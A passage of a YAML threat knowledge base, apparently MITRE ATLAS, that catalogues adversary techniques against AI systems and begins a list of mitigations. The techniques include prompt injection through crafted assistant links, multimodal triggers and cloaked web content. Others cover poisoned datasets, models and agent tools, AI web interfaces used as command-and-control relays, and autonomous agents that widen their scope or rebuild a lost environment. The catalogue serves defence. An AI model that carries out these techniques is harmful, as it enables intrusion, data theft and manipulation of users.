      cookies may provide access to chat interfaces, AI agents, AI service consoles,
      customer support platforms, model management dashboards, or other tools connected
      to sensitive data and workflows.


      Adversaries may obtain session cookies from browser storage, process memory,
      network traffic, or applications that store authentication material in memory.
      They may also steal cookies by injecting malicious JavaScript into AI-rendered
      content, abusing unsafe rendering of LLM outputs, or tricking users or AI operators
      into opening poisoned content that executes in their browser.


      In attacks on AI systems, session cookie theft can allow adversaries to bypass
      normal authentication flows and gain access to privileged AI-enabled applications
      without knowing the victim''s username, password, or MFA secret. Stolen cookies
      may then be used with [Use Alternate Authentication Material: Web Session Cookie](/techniques/AML.T0091.001)
      to access the corresponding service as the victim.'
    references: []
    created-date: '2026-06-30'
    modified-date: '2026-06-30'
    platforms:
    - Enterprise
    attack-reference:
      id: T1539
      url: https://attack.mitre.org/techniques/T1539/
    id: AML.T0113
    maturity: Demonstrated
    uuid: bd255694-5675-50a3-b03e-c341bebd72f5
    object-type: technique
  AML.T0114:
    name: AI Service Web Interface
    description: 'Adversaries may communicate with compromised systems by abusing
      the web interface of an AI service as an intermediary command-and-control relay.
      Instead of connecting directly to attacker-controlled infrastructure or using
      an AI provider''s API, malware may open or automate a browser, embedded browser,
      or WebView component to interact with a public AI assistant.


      The malware may prompt the AI assistant to fetch an attacker-controlled URL,
      include victim data in URL parameters or prompt content, and return attacker-supplied
      content through the AI assistant''s response. The implant can then parse the
      response and execute embedded instructions.


      This technique is especially useful when an AI web interface permits anonymous
      or unauthenticated browsing, summarization, or URL-fetch behavior. In those
      cases, adversaries may avoid controls that depend on API keys, service accounts,
      user identities, or revocable credentials.


      This technique allows command-and-control traffic to blend into apparently legitimate
      AI web traffic to trusted service domains. In this pattern, the AI service acts
      as a proxy between the compromised system and attacker-controlled infrastructure,
      shifting detection from API key and account monitoring toward browser automation,
      prompt content, URL-fetch behavior, and AI service telemetry.'
    references: []
    created-date: '2026-06-30'
    modified-date: '2026-06-30'
    platforms:
    - Enterprise
    id: AML.T0114
    maturity: Demonstrated
    uuid: 40a17734-3151-5082-a69d-9ec7c7edb5ce
    object-type: technique
  AML.T0115:
    name: Publish Poisoned AI Artifacts
    description: 'Adversaries may create or modify AI artifacts and publish them through
      public or shared distribution channels to facilitate compromise of downstream
      AI systems. Poisoned AI artifacts may include datasets, models, and AI agent
      tools containing malicious content, behaviors, code, or configurations.


      Adversaries may publish novel artifacts or malicious variants of legitimate
      artifacts through dataset or model repositories, package registries, source
      code repositories, tool hubs, or remotely hosted services. Victims may subsequently
      acquire and integrate these artifacts through [AI Supply Chain Compromise](/techniques/AML.T0010).'
    references: []
    created-date: '2026-07-31'
    modified-date: '2026-07-31'
    platforms:
    - Predictive AI
    - Generative AI
    - Agentic AI
    id: AML.T0115
    maturity: Realized
    uuid: 625576d9-f6b7-556e-bfed-35828f8476e3
    object-type: technique
  AML.T0115.000:
    name: Datasets
    description: 'Adversaries may publish poisoned datasets intended for training
      or fine-tuning AI models. The dataset may be newly created or a modified variant
      of a legitimate dataset and may contain manipulated samples, labels, annotations,
      or metadata.


      Adversaries may distribute poisoned datasets through dataset repositories, code
      repositories, file-sharing services, or compromised data sources. A victim that
      incorporates the dataset into a training pipeline may be affected by [Training
      Data Poisoning](/techniques/AML.T0020), potentially through [AI Supply Chain
      Compromise](/techniques/AML.T0010).'
    references: []
    created-date: '2026-07-31'
    modified-date: '2026-07-31'
    platforms:
    - Predictive AI
    - Generative AI
    - Agentic AI
    id: AML.T0115.000
    maturity: Demonstrated
    uuid: 639ae26e-0aad-5969-ad81-a6ef134297c6
    object-type: technique
  AML.T0115.001:
    name: Models
    description: 'Adversaries may publish poisoned AI models through model registries,
      code repositories, or other model distribution channels. The model may be newly
      created or a modified variant of a legitimate model and may contain manipulated
      weights, configurations, architecture, serialized code, or other components
      that produce malicious behavior or execute malicious code.


      Victims may subsequently download and integrate the model through [AI Supply
      Chain Compromise](/techniques/AML.T0010).'
    references: []
    created-date: '2026-07-31'
    modified-date: '2026-07-31'
    platforms:
    - Predictive AI
    - Generative AI
    - Agentic AI
    id: AML.T0115.001
    maturity: Realized
    uuid: 28b3b5f8-fc35-5fd2-bc4b-b7d2cfec3110
    object-type: technique
  AML.T0115.002:
    name: AI Agent Tools
    description: 'Adversaries may create and publish poisoned AI agent tools. Poisoned
      tools may contain malicious model-visible definitions or instructions, hidden
      executable behavior, or runtime responses designed to manipulate an AI agent.
      Tools may be published through source code repositories, package registries,
      agent tool or skill registries, or adversary-controlled remote services. The
      tool may be newly created or a modified variant of a legitimate tool and may
      produce malicious behavior when selected, installed, or invoked by a victim''s
      AI agent.


      Adversaries may distribute poisoned tools through open-source version control
      repositories (e.g. GitHub, GitLab), package registries (e.g. npm), or to repositories
      specifically designed for sharing tools (e.g. OpenClaw Hub). These registries
      may be largely unregulated and may contain many poisoned tools [[opensourcemalware]].
      Tools may also be published as remotely hosted servers [[mcpservers]].'
    references:
    - id: mcpservers
      title: Remote MCP Servers | Awesome MCP Servers
      url: https://mcpservers.org/remote-mcp-servers
    - id: opensourcemalware
      title: ClawdBot Skills Just Ganked Your Crypto | OpenSourceMalware
      url: https://opensourcemalware.com/blog/clawdbot-skills-ganked-your-crypto
    created-date: '2026-07-31'
    modified-date: '2026-07-31'
    platforms:
    - Agentic AI
    id: AML.T0115.002
    maturity: Realized
    uuid: 75f2d288-ce6a-5f97-a79a-b621903b526a
    object-type: technique
  AML.T0116:
    name: Autonomous Reconnaissance
    description: 'Adversaries may use autonomous AI agents to conduct [Reconnaissance](/tactics/AML.TA0002)
      activities. Given an objective, target, or partial lead, an agent may autonomously
      determine what information to obtain and how to investigate it. It may interpret
      observations, identify gaps in its understanding of the externally observable
      attack surface, and select subsequent reconnaissance actions without a human
      specifying each investigative step.


      The agent may formulate investigative questions or hypotheses, select sources
      and approaches for addressing them, and update its understanding as new information
      is obtained. Findings may generate additional reconnaissance objectives or change
      the scope, depth, or direction of the investigation. This creates a recursive
      action-observation process in which reconnaissance results influence what the
      agent investigates next rather than merely supplying output from a predefined
      procedure.


      The agent may correlate information across public sources and externally accessible
      services, prioritize promising systems, investigate suspected vulnerabilities,
      abandon unsuccessful approaches, or select alternative methods. It may also
      expand or substitute targets based on discovered names, infrastructure, or contextual
      relationships and independently reassess whether a system remains relevant or
      in scope. Incorrect assumptions may cause unrelated or unauthorized systems
      to be pursued, while successful scope recognition may cause the agent to stop
      or redirect its activity.


      Autonomous AI agents can sustain reconnaissance across long-running operations,
      reason over multiple information sources, and test many alternative paths at
      a speed and volume difficult for human operators to maintain.'
    references: []
    created-date: '2026-08-31'
    modified-date: '2026-08-31'
    platforms:
    - Predictive AI
    - Generative AI
    - Agentic AI
    - Enterprise
    id: AML.T0116
    maturity: Realized
    uuid: 5af07fd9-ea3e-50fb-a647-bc3709d595d8
    object-type: technique
  AML.T0117:
    name: Autonomous Attack-Path Adaptation
    description: 'Adversaries may use an AI agent to autonomously construct and repeatedly
      revise an attack path toward an adversary-defined objective. Given a high-level
      objective, the system may derive intermediate objectives, identify prerequisites,
      and compare candidate paths, and incorporate observations from previous actions
      to adaptively sequence techniques without a human directing each step.


      Autonomous AI agents may also exhibit this behavior while pursuing an objective
      provided for a legitimate, benign, or authorized purpose when the intermediate
      objectives or methods selected by the system cross an authorization, trust,
      control, or safety boundary and result in attempted or realized harmful cyber
      activity.


      Through repeated observation-decision-action cycles, the system may interpret
      command output, errors, defensive responses, changes in access, and newly discovered
      information. It may use those observations to reprioritize actions, replace
      an intermediate objective, abandon an unproductive branch, discard findings
      invalidated by additional evidence, or pursue an alternative path.


      An autonomous AI system may generate enabling objectives whose primary purpose
      is to increase its future operational capability rather than directly accomplishing
      the assigned objective. These objectives may include acquiring new exploits
      (See [Autonomous Exploit Development](/techniques/AML.T0017.001)), additional
      authorities, identities, execution environments, communication paths, tools,
      or trust relationships that expand the set of actions available to subsequent
      planning cycles. Newly acquired capabilities may themselves become prerequisites
      for additional enabling objectives, resulting in progressive expansion of the
      agent''s operational reach over the course of an operation.


      Attack-path replanning may occur within one agent run or emerge across multiple
      independent agents. Agents may communicate persistent, shared artifacts (See
      [Autonomous AI Agent Communication: Communication via Shared Artifacts](/techniques/AML.T0118.000)),
      allowing discoveries, requests, capabilities, constraints, task state, and results
      produced by one agent to affect the subsequent path selected by another. Participating
      agents may adopt peer requests, divide work voluntarily, reuse successful methods,
      continue incomplete activity, or redirect their local paths without a centralized
      planner, shared context window, or complete view of the broader operation.


      Human involvement does not preclude autonomous attack-path replanning. A human
      operator, user, evaluator, or workflow may select the target, define the objective,
      establish constraints, provide capabilities, or approve consequential transitions.


      [Autonomous Attack-Path Adaptation](/techniques/AML.T0117) and [Autonomous Attack
      Orchestration](/techniques/AML.T0124) may occur together but describe different
      control functions. Attack-path adaptation captures how evidence changes the
      selected path. Attack orchestration captures how work is allocated, coordinated,
      validated, and redirected across agents.'
    references: []
    created-date: '2026-08-31'
    modified-date: '2026-08-31'
    platforms:
    - Predictive AI
    - Generative AI
    - Agentic AI
    - Enterprise
    id: AML.T0117
    maturity: Realized
    uuid: 7e077279-5b65-5791-8d01-bfdbb4426094
    object-type: technique
  AML.T0118:
    name: Autonomous AI Agent Communication
    description: "Autonomous AI agents may exchange operational information with other\
      \ AI agents, sub-agents, or independent agent runs. Exchanged information may\
      \ include discoveries, objectives, tasking, capabilities, credentials, constraints,\
      \ operating rules, task state, targeting information, instructions, or results.\
      \ Communication enables autonomous AI agents to coordinate activities, share\
      \ discoveries, delegate work, request assistance, validate results, or revise\
      \ future actions without requiring a human operator to direct each interaction.\
      \ \n\nAutonomous AI agents may independently determine when communication is\
      \ operationally beneficial, what information to exchange, and how to best utilize\
      \ exchanged information to accomplish their task. The receiving AI agent may\
      \ interpret the shared information and use it to continue prior activity, investigate\
      \ a lead, perform a task, reuse a capability, validate a result, or revise subsequent\
      \ attack activity.\n\nCommunication may occur directly through an agent interface\
      \ (See [Direct Agent Communication](/techniques/AML.T0118.001)) or indirectly\
      \ via writeable shared resources (See [Communication via Shared Artifacts](/techniques/AML.T0118.000))."
    references: []
    created-date: '2026-08-31'
    modified-date: '2026-08-31'
    platforms:
    - Agentic AI
    - Enterprise
    id: AML.T0118
    maturity: Realized
    uuid: 9c44e52a-71e1-5304-909a-e8b45849093d
    object-type: technique
  AML.T0118.000:
    name: Communication via Shared Artifacts
    description: 'Autonomous AI agents may communicate by creating or modifying artifacts
      in a shared resource that persists outside their individual execution contexts.
      Shared artifacts may convey discoveries, objectives, tasking, credentials, capabilities,
      operating rules, progress, scripts, targeting information, instructions, or
      results.


      Shared artifacts allow communication to occur asynchronously and across independent
      runs. An agent may publish information for later retrieval, adopt information
      left by another agent, or update the shared state with new findings, progress,
      or results. Participating agents do not need to share a model, orchestrator,
      context window, or overlapping execution period.


      The shared resource may be established for the operation or may be an existing
      repository, file store, message board, database, object store, queue, or similar
      service repurposed by the agents.'
    references: []
    created-date: '2026-08-31'
    modified-date: '2026-08-31'
    platforms:
    - Agentic AI
    - Enterprise
    id: AML.T0118.000
    maturity: Realized
    uuid: cabe9a15-54bd-5718-b826-ead28d017ad5
    object-type: technique
  AML.T0118.001:
    name: Direct Agent Communication
    description: 'Autonomous AI agents may communicate directly through agent-to-agent,
      sub-agent, or orchestrator interfaces. An agent may provide another agent with
      operational context, discoveries, objectives, tasking, capabilities, credentials,
      or constraints, and may receive status, findings, or completed work in response.


      Direct communication may include delegation when the sending agent formulates
      or selects an objective or subtask and the recipient retains meaningful discretion
      over how to perform it. Direct exchanges may also report discoveries, request
      independent validation, synchronize activity, transfer capabilities, or return
      findings without delegating a new task.'
    references: []
    created-date: '2026-08-31'
    modified-date: '2026-08-31'
    platforms:
    - Agentic AI
    - Enterprise
    id: AML.T0118.001
    maturity: Realized
    uuid: f3054a69-534b-56b4-8430-43dbd5f0a977
    object-type: technique
  AML.T0119:
    name: Exploit Automated Artifact Processing Pipeline
    description: 'Adversaries may submit, publish, or modify an artifact in a way
      that triggers an automated processing pipeline. As the pipeline handles the
      artifact, adversary-controlled content or configuration may exploit a weakness
      in the processing logic, causing the processor to act outside its intended behavior
      using the permissions and access of a processing worker.


      Exploitation may cause the worker to access local or internal resources and
      expose information through normal processing output or evaluate adversary-controlled
      content and execute code. The attack is triggered by automated backend processing
      and does not require a victim to open, load, or approve the artifact.'
    references: []
    created-date: '2026-08-31'
    modified-date: '2026-08-31'
    platforms:
    - Enterprise
    id: AML.T0119
    maturity: Realized
    uuid: 70202b33-9ad2-5300-8664-0b4331937abb
    object-type: technique
  AML.T0120:
    name: AI Artifact Repository
    description: 'Adversaries may repurpose AI artifact repositories as asynchronous
      command-and-control channels. Commands, payloads, or tasking may be placed in
      repository objects for a compromised system to retrieve or poll. The compromised
      system may then write execution results, status, or collected information back
      to the repository for retrieval by the adversary.


      This communication can use ordinary artifact and repository operations, such
      as reading or updating artifact content, metadata, or revisions through an API
      or version-control interface. The repository acts as a message queue or dead
      drop, allowing the parties to exchange information without a continuous direct
      connection and potentially blending the activity with legitimate artifact traffic.'
    references: []
    created-date: '2026-08-31'
    modified-date: '2026-08-31'
    platforms:
    - Predictive AI
    - Generative AI
    - Agentic AI
    - Enterprise
    id: AML.T0120
    maturity: Realized
    uuid: 0df9e0d9-d33a-5192-8fb1-3a04572d2132
    object-type: technique
  AML.T0121:
    name: AI Agent Environment Reconstruction
    description: An autonomous AI agent may reconstruct the environment needed to
      continue an existing operation after its execution environment is lost, reset,
      replaced, denied, or made unusable. The agent may recover or recreate tools,
      dependencies, configuration, credentials or access paths, communication or coordination
      resources, working artifacts, and externally stored operational state in order
      to resume the same objective.
    references: []
    created-date: '2026-08-31'
    modified-date: '2026-08-31'
    platforms:
    - Enterprise
    id: AML.T0121
    maturity: Realized
    uuid: 6af60214-f4f1-5eea-8d5d-d137b12012a6
    object-type: technique
  AML.T0122:
    name: Exploitation of Remote Services
    description: 'Adversaries may exploit a software or design weakness in a service
      reachable from their current environment to gain unauthorized access to another
      system, component, network, or trust boundary. Exploitation may allow the adversary
      to execute code, access protected resources, invoke unauthorized operations,
      obtain the service''s privileges, or cause the service to make network requests
      or perform actions on the adversary''s behalf.


      In AI environments, remote services may include package caches, artifact and
      model registries, dataset services, evaluation infrastructure, inference gateways,
      experiment trackers, vector databases, notebooks, training pipelines, orchestration
      services, and cloud or cluster control-plane interfaces. These services may
      be reachable from otherwise isolated training, evaluation, or agent workloads
      and can provide transitive access to internal infrastructure or external networks.


      Exploitation does not require compromise of the remote service''s underlying
      host. For example, an adversary may exploit a server-side request vulnerability
      in a shared service to cross a network-containment boundary while leaving the
      service host itself uncompromised. Exploitation that produces host access, privilege
      escalation, credential disclosure, command execution, or another effect should
      be mapped separately to the applicable technique.'
    references: []
    created-date: '2026-08-31'
    modified-date: '2026-08-31'
    platforms:
    - Enterprise
    attack-reference:
      id: T1210
      url: https://attack.mitre.org/techniques/T1210/
    id: AML.T0122
    maturity: Realized
    uuid: 9b6b86b4-4994-5746-be68-59ac4e520c20
    object-type: technique
  AML.T0123:
    name: Obfuscated Files or Information
    description: 'Adversaries may attempt to make an executable or file difficult
      to discover or analyze by encrypting, encoding, or otherwise obfuscating its
      contents on the system or in transit. This is common behavior that can be used
      across different platforms and the network to evade defenses.


      Obfuscation may target AI-enabled defensive systems, including malware classifiers,
      content filters, secret scanners, and automated review systems. Content that
      appears benign or incomplete to a person or detector may be decoded, assembled,
      or interpreted by a downstream application, tool, or compromised system.'
    references: []
    created-date: '2026-08-31'
    modified-date: '2026-08-31'
    platforms:
    - Predictive AI
    - Enterprise
    id: AML.T0123
    maturity: Realized
    uuid: 159f62ec-7250-56a9-be1a-21bc21ca5095
    object-type: technique
  AML.T0124:
    name: Autonomous Attack Orchestration
    description: 'Adversaries may use autonomous AI systems as an operational control
      layer to manage multiple distinct autonomous agents or sub-agents toward a common
      adversary-defined objective. The orchestrating system may create assignments,
      select executors, allocate tools or resources, establish dependencies, schedule
      or synchronize activities, and track progress without a human directing each
      assignment.


      The autonomous system exhibits centralized control over distributed execution
      including which agent performs which work, when it performs it, and how its
      output affects other assigned work. The system may aggregate findings and status
      from participating agents, request independent validation, reconcile conflicting
      results, prevent or resolve duplicated effort, and determine when an output
      satisfies a prerequisite for another activity. It may reassign stalled work,
      increase or reduce resources allocated to a branch, terminate low-value work,
      or initiate additional research or testing.


      Orchestration may use direct agent interfaces (See [Autonomous AI Agent Communication:
      Direct Agent Communication](/techniques/AML.T0118.001)) to transmit assignments,
      status, and results.


      Human involvement does not preclude autonomous attack orchestration. A human
      operator may define campaign objectives, select targets, provide infrastructure,
      establish constraints, or retain approval over consequential transitions.


      [Autonomous Attack-Path Adaptation](/techniques/AML.T0117) and [Autonomous Attack
      Orchestration](/techniques/AML.T0124) may occur together but describe different
      control functions. Attack-path adaptation captures how evidence changes the
      selected path. Attack orchestration captures how work is allocated, coordinated,
      validated, and redirected across agents.'
    references: []
    created-date: '2026-08-31'
    modified-date: '2026-08-31'
    platforms:
    - Predictive AI
    - Generative AI
    - Agentic AI
    - Enterprise
    id: AML.T0124
    maturity: Realized
    uuid: bdec6dc8-f06f-5176-b5e9-a91d48b34822
    object-type: technique
  AML.T0125:
    name: Create Account
    description: 'Adversaries may create an account to maintain access to an AI system
      or its supporting infrastructure. With a sufficient level of access, creating
      such accounts may be used to establish secondary credentialed access that do
      not require persistent remote access tools to be deployed on the system.


      Accounts may be created on local systems, in enterprise domains, cloud tenants,
      identity providers, or individual services. In AI environments, adversaries
      may create user, service, workload, or automation accounts in AI platforms,
      model or dataset repositories, development environments, experiment trackers,
      orchestration services, data stores, and other AI operations infrastructure.'
    references: []
    created-date: '2026-08-31'
    modified-date: '2026-08-31'
    platforms:
    - Enterprise
    attack-reference:
      id: T1136
      url: https://attack.mitre.org/techniques/T1136/
    id: AML.T0125
    maturity: Realized
    uuid: 06d62b8a-09eb-52e9-a71d-5725647365d6
    object-type: technique
  AML.T0126:
    name: Automated Collection
    description: 'Adversaries may use automated techniques to collect data from AI
      systems and supporting enterprise environments. Automation may use scripts,
      command interpreters, command-line tools, or AI agent tools to identify, retrieve,
      copy, or aggregate data without a human selecting each individual item.


      Collection criteria may be fixed, such as file name, type, location, owner,
      date. Automation may also collect repeatedly, monitor for new material, traverse
      related resources, or combine data from local systems, cloud services, repositories,
      databases, object stores, and application APIs.


      In AI environments, targeted material may include models, datasets, configurations,
      conversation histories, retrieval databases, deployment information, logs, and
      other operational data.'
    references: []
    created-date: '2026-08-31'
    modified-date: '2026-08-31'
    platforms:
    - Enterprise
    attack-reference:
      id: T1119
      url: https://attack.mitre.org/techniques/T1119/
    id: AML.T0126
    maturity: Realized
    uuid: 5477d686-66c6-5eb0-aaa5-08bf0f88758c
    object-type: technique
  AML.T0127:
    name: Data Staged
    description: 'Adversaries may stage collected data in a central location before
      exfiltration. Staging consolidates, organizes, or prepares information obtained
      from one or more sources so it can be reviewed, processed, transferred, or retrieved
      more efficiently.


      Data may be staged on a compromised local system, another system in the victim
      environment, a cloud instance, shared storage, an application repository, or
      other remote infrastructure. It may remain in separate files or be combined
      into archives, databases, structured documents, manifests, or other collections.
      Adversaries may compress, encrypt, encode, split, rename, or otherwise transform
      staged data.'
    references: []
    created-date: '2026-08-31'
    modified-date: '2026-08-31'
    platforms:
    - Enterprise
    attack-reference:
      id: T1074
      url: https://attack.mitre.org/techniques/T1074/
    id: AML.T0127
    maturity: Realized
    uuid: 4991e183-9513-524d-92e1-201561226aa4
    object-type: technique
  AML.T0128:
    name: Compromise Infrastructure
    description: 'Adversaries may compromise third-party infrastructure and repurpose
      it to support attacks against AI system. Rather than buying, leasing, registering,
      or otherwise legitimately acquiring a resource, the adversary gains unauthorized
      control of infrastructure owned or operated by another party.


      Compromised infrastructure may include physical or cloud servers, domains, network
      devices, third-party web and DNS services, software or artifact repositories,
      development workspaces, compute services, and other externally hosted resources.


      In operations involving AI systems, adversaries may compromise infrastructure
      used for model development, artifact hosting, dataset processing, evaluation,
      inference, agent tooling, or AI operations. They may repurpose this infrastructure
      to host malicious artifacts, stage payloads, run tools or agents, relay traffic,
      capture credentials, provide command and control, process collected data, or
      launch attacks against additional systems.


      Compromised infrastructure may appear trustworthy because it uses a legitimate
      provider, established domain, valid certificate, reputable service, or expected
      AI development platform. It may also provide network access, compute resources,
      service identities, or trusted relationships that would be difficult for the
      adversary to establish directly.'
    references: []
    created-date: '2026-08-31'
    modified-date: '2026-08-31'
    platforms:
    - Enterprise
    attack-reference:
      id: T1584
      url: https://attack.mitre.org/techniques/T1584/
    id: AML.T0128
    maturity: Realized
    uuid: 60f39cf9-37d9-552c-a0ee-76da5f2722bc
    object-type: technique
  AML.T0129:
    name: Triggers in Multimodal Inputs
    description: 'Adversaries may place instructions or triggers in one part of a
      multimodal input to influence the model while staying unnoticed by human reviewers
      and by defenses that do not inspect all input modalities.


      Multimodal systems jointly process text alongside other modalities, yet many
      moderation and filtering controls operate mainly on the textual channel. A payload
      placed in a modality that is not inspected, or is inspected differently from
      text, is still parsed by the model but can escape detection, allowing it to
      alter model output or carry a cross-modal prompt injection.


      Examples include instructions placed in an image, audio, or video channel, or
      carried in file metadata (e.g. EXIF for images, ID3 tags for audio, or document
      metadata).'
    references: []
    created-date: '2026-09-15'
    modified-date: '2026-09-15'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0129
    maturity: Feasible
    uuid: 01f99040-d726-5e8f-ad30-28bdc2d37aa0
    object-type: technique
  AML.T0130:
    name: AI Agent Response Biasing
    description: 'Adversaries may manipulate an AI assistant so that it favors adversary-chosen
      sources, or content in its responses. By injecting instructions such as "treat
      [source] as a trusted source" or "recommend [source] first," an adversary biases
      the assistant''s outputs toward their own interests, causing it to present promotional
      or self-serving content as if it were a neutral, well-reasoned response. This
      degrades the integrity and trustworthiness of the assistant''s responses on
      topics the user may rely on, such as health, finance, or security, without the
      user being aware that the advice has been skewed.


      The injected instructions can be delivered through different ways, for example
      through [Crafted AI Assistant Links]. This impact may persist if the agent''s
      memory was poisoned (See [AI Agent Context Poisoning: Memory](/techniques/AML.T0080.000)).'
    references:
    - id: ai-recommendation-poisoning
      title: 'Manipulating AI memory for profit: The rise of AI Recommendation Poisoning'
      url: https://www.microsoft.com/en-us/security/blog/2026/02/10/ai-recommendation-poisoning/
    created-date: '2026-09-15'
    modified-date: '2026-09-15'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0130
    maturity: Realized
    uuid: 747725ce-967f-55ba-b78e-ec2a562176ca
    object-type: technique
  AML.T0131:
    name: Crafted AI Assistant Links
    description: 'Adversaries may craft links that open an AI assistant or agent with
      attacker-controlled input already supplied, so that opening the link initiates
      an interaction the adversary defines rather than one the target composed. Many
      AI assistants accept a prompt through URL parameters (for example `?q=` or `?prompt=`)
      that is automatically populated, and in some cases submitted, when the link
      is opened. By encoding a chosen prompt into such a link, an adversary can cause
      the target''s assistant to act on supplied instructions as soon as the link
      is opened.


      These links are frequently disguised as helpful actions, such as a "Summarize
      with AI" button or a share link, and distributed through web pages, emails,
      documents, or messages. Because the resulting interaction runs in the target''s
      own assistant session, a crafted link can drive a range of downstream impacts
      depending on the supplied instructions, such as exfiltrating data the assistant
      can access or for [AI Recommendation Poisoning](/techniques/AML.T0131).'
    references: []
    created-date: '2026-09-15'
    modified-date: '2026-09-15'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0131
    maturity: Realized
    uuid: 509cf97c-489d-57a6-ad7e-b23471d36d72
    object-type: technique
  AML.T0132:
    name: Misconfigured or Publicly Exposed AI Services
    description: 'AI agents and LLM platforms are deployed across diverse architectures,
      including standalone servers, SaaS platforms, and low-code builders. All of
      these often have misconfigured access controls, ranging from missing authentication
      in LLM runtimes to permissive public access settings, that significantly expand
      their attack surface.


      AI agent''s security posture affects how attackers are able to explore which
      agentic attack surface is available to them and directly either expands or limits
      an adversary''s ability to discover and interact with a target''s AI agents.
      For example, one internet-facing AI service could be more easily discoverable
      by any unauthenticated user, while another may require compromised credentials
      to even be discovered.


      Adversaries may discover and interact with AI agents and LLM services as unauthenticated
      users via a combination of various OSINT and active scanning methods. These
      could include using search engines to discover accessible agentic deployments
      (See [Search Open Technical Databases](/techniques/AML.T0000)), search backlinks
      which could indicate existing or open agents which have been embedded to frontends
      (See [Search Open Website/Domains](/techniques/AML.T0095)), or directly scanning
      a target''s AI infrastructure (See [Active Scanning](/techniques/AML.T0006)).'
    references: []
    created-date: '2026-09-15'
    modified-date: '2026-09-15'
    platforms:
    - Predictive AI
    - Generative AI
    - Agentic AI
    id: AML.T0132
    maturity: Demonstrated
    uuid: ca156987-1511-5073-8ac0-70d2639b4214
    object-type: technique
  AML.T0133:
    name: Discover AI Agent Runtime Capabilities
    description: 'Adversaries may interact with an AI agent at runtime to reveal the
      capabilities available to it, without requiring access to its underlying configuration.
      Direct interaction with the agent can surface its registered tools and their
      accepted parameters, the actions it can take, the resources it can reach, and
      the identity and permission scope it acts under. Capabilities can also be inferred
      indirectly by issuing varied requests and observing which succeeded, failed,
      or refused.


      AI agents are often interconnected with enterprise resources, tools and databases,
      or embedded within SaaS platforms and have permissions to act on behalf of users
      in order to facilitate functionality. Once adversaries identify a functional
      agent that they have access to, they could map the attack surface within that
      agent, by testing its functionality, enumerating tools, capabilities, knowledge,
      and embedded credentials and permissions.


      This mapping process often reveals the AI agent''s full toolset and configuration
      details and exposes additional exploitation, as enabled by [AI Agent Tool Invocation](/techniques/AML.T0053).
      The resulting intelligence facilitates follow-on exploitation, including [Initial
      Access](/tactics/AML.TA0004), [Persistence](/tactics/AML.TA0006), [Privilege
      Escalation](/tactics/AML.TA0012), and [Exfiltration](/tactics/AML.TA0010).'
    references: []
    created-date: '2026-09-15'
    modified-date: '2026-09-15'
    platforms:
    - Agentic AI
    id: AML.T0133
    maturity: Feasible
    uuid: 6271c497-0bc7-59fa-b6d3-d4e730c87902
    object-type: technique
  AML.T0134:
    name: AI Targeted Cloaking
    description: 'Adversaries may selectively deliver malicious or manipulated content
      to AI systems, while presenting different benign content to human users, web
      crawlers, or security detection mechanisms. They may identify AI browsers or
      agents via user-agent strings and condition the server response so that AI-based
      clients receive prompt injections or misleading content.


      Preventing human visitors, conventional web crawlers, and security tools from
      observing the same content allows adversaries to make malicious input more difficult
      to detect. [AI Targeted Cloaking](/techniques/AML.T0134) may be combined with
      [Drive-by Compromise](/techniques/AML.T0078) to deliver an [LLM Prompt Injection](/techniques/AML.T0051).'
    references: []
    created-date: '2026-09-15'
    modified-date: '2026-09-15'
    platforms:
    - Agentic AI
    id: AML.T0134
    maturity: Feasible
    uuid: 27a1319d-d531-58fb-8b72-a3cc4abe1e02
    object-type: technique
mitigations:
  AML.M0000:
    name: Limit Public Release of Information
    description: Limit the public release of technical information about the AI stack
      used in an organization's products or services. Technical knowledge of how AI
      is used can be leveraged by adversaries to perform targeting and tailor attacks
      to the target system. Additionally, consider limiting the release of organizational
      information - including physical locations, researcher names, and department
      structures - from which technical details such as AI techniques, model architectures,
      or datasets may be inferred.
    references: []
    created-date: '2023-04-12'
    modified-date: '2026-07-31'
    lifecycle-phases:
    - Business and Data Understanding
    categories:
    - Policy
    id: AML.M0000
    uuid: c35b59f9-60f8-5bd1-ad76-9cbb549a97ce
    object-type: mitigation
  AML.M0001:
    name: Limit Model Artifact Release
    description: Limit public release of technical project details including data,
      algorithms, model architectures, and model checkpoints that are used in production,
      or that are representative of those used in production.
    references: []
    created-date: '2023-04-12'
    modified-date: '2026-07-31'
    lifecycle-phases:
    - Business and Data Understanding
    - Deployment
    categories:
    - Policy
    id: AML.M0001
    uuid: 68a1c707-b05e-5588-b0a3-01aa35182ed0
    object-type: mitigation
  AML.M0002:
    name: Predictive AI Output Obfuscation
    description: 'Reduce the fidelity and amount of information returned by predictive
      AI inference endpoints to make model discovery, extraction, replication, and
      black-box adversarial-example optimization more difficult.


      Limit outputs to those required by the application. Depending on the use case,
      this may include withholding or reducing the precision of confidence scores,
      logits, class rankings, labels, embeddings, or additional model metadata.'
    references: []
    created-date: '2023-04-12'
    modified-date: '2026-07-31'
    lifecycle-phases:
    - AI Model Evaluation
    - Deployment
    categories:
    - Technical - AI
    id: AML.M0002
    uuid: 8aaa7934-9c52-56f0-a48d-1f5258e4288b
    object-type: mitigation
  AML.M0003:
    name: Predictive AI Model Hardening
    description: 'Design and train predictive AI models to maintain intended performance
      when presented with adversarial examples. Adversarial examples may include digitally
      perturbed inputs or physical countermeasures intended to cause misclassification,
      missed detection, or another attacker-selected prediction.


      Robustness techniques may include adversarial training, robust model architectures,
      defensive distillation, and certified robustness methods.'
    references: []
    created-date: '2023-04-12'
    modified-date: '2026-07-31'
    lifecycle-phases:
    - Data Preparation
    - AI Model Engineering
    categories:
    - Technical - AI
    id: AML.M0003
    uuid: e3e2c4e7-ecc1-5e0b-a276-9b00c0b30204
    object-type: mitigation
  AML.M0004:
    name: Limit AI Service Query Volume and Rate
    description: 'Limit the number and rate of requests that users can submit to an
      AI service. Apply limits by user, API key, tenant, device, or other authenticated
      identity. Use short-term rate, burst, and concurrency limits together with longer-term
      usage quotas.


      Query limits can increase the time and cost required to extract model information,
      optimize adversarial inputs, discover system behavior, verify attacks, or overwhelm
      a service. Monitor for attempts to evade limits through distributed requests,
      account rotation, or stolen credentials. Query limits may not protect against
      attacks that require few requests or are performed against an offline model.'
    references: []
    created-date: '2023-04-12'
    modified-date: '2026-07-31'
    lifecycle-phases:
    - Business and Data Understanding
    - Deployment
    - Monitoring and Maintenance
    categories:
    - Technical - Cyber
    id: AML.M0004
    uuid: 1b15d839-8893-5005-aba7-62c3cc8b48ac
    object-type: mitigation
  AML.M0005:
    name: Control Access to AI Models and Data at Rest
    description: Establish access controls on internal model registries and limit
      internal access to production models. Limit access to training data only to
      approved users.
    references: []
